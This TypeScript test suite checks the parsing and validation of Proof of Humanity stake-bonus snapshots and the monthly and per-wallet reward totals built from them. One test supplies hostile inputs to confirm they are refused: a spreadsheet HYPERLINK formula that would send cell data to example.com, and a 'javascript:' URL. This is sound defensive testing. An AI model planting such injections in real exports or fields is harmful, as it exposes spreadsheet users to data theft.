import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { fetchJson } from "../src/utils/fetchSnapshots.ts";
import {
  aggregate,
  bonusRewards,
  claimReward,
  countHumans,
  snapshotMonth,
  walletTotals,
  type PohReward,
} from "../src/utils/pohRewards.ts";

const PNK = 10n ** 18n;
const AUGUST_URL = "https://cdn.kleros.link/ipfs/QmPx6bNqFVdZMk39ohX6X6aJMhwBzRpyWDQaXvumuJ4Tuo/poh-stake-bonus-2026-08.json";
const TX = "0xea3f6f924cf872e587176938e3bb009fbdcfaf1895ea6215df40a000bb0fbc61";
const AUGUST_TX = "0x36510cf9f9709ede19f423620bc77c244d9ad6085c8a0446d71aefc310ed414b";
// A's six months ended on 6 Aug and it was paid late, on 4 Nov; B's ended on 1 Aug and it was paid on 21 Aug.
const A = "0x5be1580bbdff10b11cccd85ab4a9a455655dfde2";
const B = "0x12c8585b54220fb7b59599b51f76cac4e12f55fe";

const line = (humanityId: string, windowEnd: string, txHash = TX, paidAt = "2026-11-04T09:42:05.000Z") => ({
  humanityId,
  windowEnd,
  txHash,
  paidAt,
  amount: (1200n * PNK).toString(),
});

// The shape npm run snapshot writes (Proof-Of-Humanity/poh-airdrop-stake-rewards), trimmed to two recipients:
// the bonuses earned in August 2026, whenever they were paid.
const snapshot = () => ({
  schema: "poh-stake-bonus/v1",
  period: { label: "2026-08", start: "2026-08-01T00:00:00.000Z", end: "2026-09-01T00:00:00.000Z" },
  generatedAt: "2026-11-12T22:15:51.977Z",
  chainId: 100,
  token: { symbol: "stPNK", address: "0xcb3231aBA3b451343e0Fddfc45883c842f223846" },
  totals: { stakeBonus: (2400n * PNK).toString(), total: (2400n * PNK).toString(), recipientCount: 2 },
  recipients: {
    [B]: { total: (1200n * PNK).toString(), stakeBonus: [line(B, "2026-08-01", AUGUST_TX, "2026-08-21T15:33:25.000Z")] },
    [A]: { total: (1200n * PNK).toString(), stakeBonus: [line(A, "2026-08-06")] },
  } as Record<string, { total: string; stakeBonus: ReturnType<typeof line>[] }>,
  note: "",
});

const claim = (humanityId: string, wallet: string, isoTime: string): PohReward =>
  claimReward({
    id: humanityId,
    amount: (1200n * PNK).toString(),
    timestamp: String(Date.parse(isoTime) / 1000),
    claimer: { id: wallet },
  });

test("a stake bonus snapshot becomes one payment per line, counted in the month it was earned, its URL's", () => {
  const rewards = bonusRewards(AUGUST_URL, snapshot());
  assert.equal(rewards.length, 2);
  // paid in November, earned in August
  assert.deepEqual(rewards.find((r) => r.address === A), {
    kind: "stakeBonus",
    address: A,
    humanityId: A,
    amount: 1200n * PNK,
    paidAt: "2026-11-04T09:42:05.000Z",
    month: "2026-08",
    txHash: TX,
    windowEnd: "2026-08-06",
  });
});

test("recipient keys and humanity IDs are lowercased, so a checksummed key still matches the claim", () => {
  const raw = snapshot();
  const checksummed = "0x5BE1580bBDFF10B11cCcD85Ab4a9a455655dfdE2";
  raw.recipients[checksummed] = { ...raw.recipients[A], stakeBonus: [line(checksummed, "2026-08-06")] };
  delete raw.recipients[A];
  const [reward] = bonusRewards(AUGUST_URL, raw).filter((r) => r.windowEnd === "2026-08-06");
  assert.equal(reward.address, A);
  assert.equal(reward.humanityId, A);
});

test("a snapshot the page can't trust is refused whole, saying why", () => {
  const refuses = (mutate: (raw: ReturnType<typeof snapshot>) => unknown, why: RegExp, url = AUGUST_URL) => {
    const raw = snapshot();
    const replaced = mutate(raw);
    assert.throws(() => bonusRewards(url, replaced === undefined ? raw : replaced), why);
  };
  refuses(() => null, /not a snapshot/);
  refuses(() => [], /not a snapshot/);
  refuses((raw) => void (raw.schema = "curate-rewards/v1"), /schema "curate-rewards\/v1"/);
  refuses((raw) => void (raw.period.label = "2026-10"), /period "2026-10" isn't the month its URL names/);
  refuses(() => snapshot(), /isn't the month its URL names/, AUGUST_URL.replace("2026-08", "2026-12"));
  refuses((raw) => ({ ...raw, recipients: [] }), /no recipients/);
  refuses((raw) => void (raw.recipients["0x1234"] = raw.recipients[A]), /recipient "0x1234" isn't an address/);
  refuses((raw) => void ((raw.recipients[A] as { stakeBonus: unknown }).stakeBonus = "1200"), /has no stakeBonus lines/);
  // the docs' hard rules: each recipient's total and every total are the sum of the lines, recipientCount is right
  refuses((raw) => void (raw.recipients[A].total = "1"), /lines don't add up to its total/);
  refuses((raw) => void (raw.totals.total = (3600n * PNK).toString()), /its lines add up to .* but totals.total is/);
  refuses((raw) => void (raw.totals.stakeBonus = "0"), /but totals.stakeBonus is "0"/);
  refuses((raw) => void (raw.totals.recipientCount = 3), /totals.recipientCount is 3, but it has 2 recipients/);
  refuses((raw) => ({ ...raw, totals: undefined }), /totals.stakeBonus undefined isn't a decimal wei string/);
});

test("an amount that isn't a positive decimal wei string is refused, not read as 0", () => {
  // all of them, so no sum check could catch it: every line and total would read as 0
  const every = (amount: unknown) => {
    const raw = snapshot() as unknown as Record<string, any>;
    for (const recipient of Object.values(raw.recipients) as any[]) {
      recipient.total = amount;
      for (const l of recipient.stakeBonus) l.amount = amount;
    }
    raw.totals.stakeBonus = amount;
    raw.totals.total = amount;
    return raw;
  };
  for (const amount of [1.2e21, "1.2e21", "1200.0", "0x41", "-1200", "+1200", "01200", "", null]) {
    assert.throws(() => bonusRewards(AUGUST_URL, every(amount)), /isn't a decimal wei string/, String(amount));
  }
  // a negative line made up for by a bigger one elsewhere
  const raw = snapshot();
  raw.recipients[A].stakeBonus[0].amount = (-1200n * PNK).toString();
  raw.recipients[B].stakeBonus[0].amount = raw.recipients[B].total = (3600n * PNK).toString();
  assert.throws(() => bonusRewards(AUGUST_URL, raw), /0x5be1.*line 1: amount "-1200000000000000000000" isn't a decimal wei string/);
  assert.throws(() => bonusRewards(AUGUST_URL, every("0")), /pays nothing/);
});

test("a line that isn't a payment is refused, not counted", () => {
  for (const bad of [null, 5, "x", []]) {
    const raw = snapshot() as unknown as Record<string, any>;
    raw.recipients[A].stakeBonus.push(bad);
    assert.throws(() => bonusRewards(AUGUST_URL, raw), /line 2 isn't a payment/, JSON.stringify(bad));
  }
});

test("a humanity ID, transaction or time that isn't one is refused", () => {
  const refuses = (field: string, value: unknown, why: RegExp) => {
    const raw = snapshot() as unknown as Record<string, any>;
    raw.recipients[A].stakeBonus[0][field] = value;
    assert.throws(() => bonusRewards(AUGUST_URL, raw), why, `${field}=${String(value)}`);
  };
  // it would land in the CSV, where a spreadsheet runs it
  refuses("humanityId", '=HYPERLINK("https://example.com/"&A1,"x")', /humanity ID .* isn't an address/);
  refuses("humanityId", undefined, /humanity ID undefined isn't an address/);
  refuses("txHash", "javascript:alert(1)", /isn't a transaction hash/);
  // six months that ended in another month belong in that month's snapshot
  refuses("windowEnd", "2026-07-31", /windowEnd "2026-07-31" isn't a day in 2026-08/);
  refuses("windowEnd", "soon", /windowEnd "soon" isn't a day in 2026-08/);
  refuses("windowEnd", undefined, /windowEnd undefined isn't a day in 2026-08/);
  // a payment before the six months ended isn't a stake bonus
  refuses("paidAt", "2026-08-05T23:59:59.000Z", /paidAt "2026-08-05T23:59:59.000Z" isn't a time on or after 2026-08-06/);
  refuses("paidAt", "1", /isn't a time on or after 2026-08-06/);
});

test("the same payment twice in a snapshot is refused", () => {
  const raw = snapshot();
  raw.recipients[A].stakeBonus.push(line(A, "2026-08-06"));
  raw.recipients[A].total = (2400n * PNK).toString();
  raw.totals.stakeBonus = raw.totals.total = (3600n * PNK).toString();
  assert.throws(() => bonusRewards(AUGUST_URL, raw), /lists the payment to 0x5be1.* twice/);
});

test("error messages quote the snapshot briefly", () => {
  const raw = snapshot();
  raw.schema = "x".repeat(500);
  assert.throws(() => bonusRewards(AUGUST_URL, raw), (error: Error) => error.message.length < 120);
});

test("the snapshot month comes from the URL's file name, as the build's index check reads it", () => {
  assert.equal(snapshotMonth(AUGUST_URL), "2026-08");
  // the build validates the path, so a query string passes it: read the same path here
  assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-12.json?filename=x"), "2026-12");
  assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-13.json"), null);
  assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/curate-rewards-2026-11.json"), null);
  assert.equal(snapshotMonth("not a url"), null);
});

test("every published URL in the bundled index names its month", () => {
  const index = JSON.parse(readFileSync(new URL("../src/assets/poh-stake-bonus-index.json", import.meta.url), "utf8"));
  assert.ok(Array.isArray(index) && index.length > 0);
  for (const url of index) assert.match(String(snapshotMonth(url)), /^\d{4}-\d{2}$/, url);
});

test("claims count in their UTC claim month, bonuses in the month they were earned", () => {
  const rewards = [
    claim(A, A, "2026-02-06T15:28:10.000Z"),
    claim(B, B, "2026-02-01T18:33:20.000Z"),
    // 23:30 UTC on 31 March is still March, wherever the browser is
    claim("0xe1f1ce92499c9985fe24d7f631095e31a88de0a7", "0xe1f1ce92499c9985fe24d7f631095e31a88de0a7", "2026-03-31T23:30:00.000Z"),
    // both in August, though one was paid in November
    ...bonusRewards(AUGUST_URL, snapshot()),
  ];
  const data = aggregate(rewards, 1);
  assert.deepEqual(
    data.months.map((m) => [m.label, m.claims, m.bonuses, m.humans, m.airdrop / PNK, m.stakeBonus / PNK, m.total / PNK]),
    [
      ["2026-08", 0, 2, 2, 0n, 2400n, 2400n],
      ["2026-03", 1, 0, 1, 1200n, 0n, 1200n],
      ["2026-02", 2, 0, 2, 2400n, 0n, 2400n],
    ]
  );
  assert.equal(data.bonusSnapshots, 1);
  assert.equal(data.rewards.length, 5);
});

test("a human paid the airdrop and the stake bonus is one human, and one wallet row with both", () => {
  const rewards = [claim(A, A, "2026-02-06T15:28:10.000Z"), claim(B, B, "2026-02-01T18:33:20.000Z"), ...bonusRewards(AUGUST_URL, snapshot())];
  assert.equal(countHumans(rewards), 2);
  const wallets = walletTotals(rewards);
  assert.equal(wallets.length, 2);
  assert.deepEqual(wallets.find((w) => w.address === A), {
    address: A,
    humanityId: A,
    airdrop: 1200n * PNK,
    stakeBonus: 1200n * PNK,
    total: 2400n * PNK,
  });
});

test("a wallet's humanity ID comes from its airdrop claim, whatever a snapshot says", () => {
  const raw = snapshot();
  raw.recipients[A].stakeBonus[0].humanityId = B;
  const rewards = [...bonusRewards(AUGUST_URL, raw), claim(A, A, "2026-02-06T15:28:10.000Z")];
  assert.equal(walletTotals(rewards).find((w) => w.address === A)!.humanityId, A);
});

test("a snapshot fetch that gets no answer gives up after its timeout", async () => {
  const realFetch = globalThis.fetch;
  // a gateway that never answers, as with a CID nobody pins
  globalThis.fetch = ((_url: string, init?: RequestInit) =>
    new Promise((_resolve, reject) => init?.signal?.addEventListener("abort", () => reject(init.signal!.reason)))) as typeof fetch;
  // AbortSignal.timeout's timer doesn't keep Node's event loop alive on its own
  const keepAlive = setInterval(() => undefined, 100);
  try {
    const started = Date.now();
    await assert.rejects(fetchJson("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-11.json", 1, 1000), /no answer within 1 s/);
    assert.ok(Date.now() - started < 3000);
  } finally {
    clearInterval(keepAlive);
    globalThis.fetch = realFetch;
  }
});

test("a wallet whose humanity ID differs keeps it, and humans are counted by humanity", () => {
  const safe = "0x3693df71e1120476a20f82dfaff0067260156c8a";
  const humanity = "0xd14eb612c81e87c7861b458914ed78a1dc1ab3cf";
  const rewards = [claim(humanity, safe, "2026-01-23T10:02:15.000Z")];
  assert.equal(rewards[0].address, safe);
  assert.equal(rewards[0].humanityId, humanity);
  assert.equal(walletTotals(rewards)[0].humanityId, humanity);
  // a payment without a humanity ID falls back to its wallet
  assert.equal(countHumans([{ ...rewards[0], humanityId: "" }, rewards[0]]), 2);
});
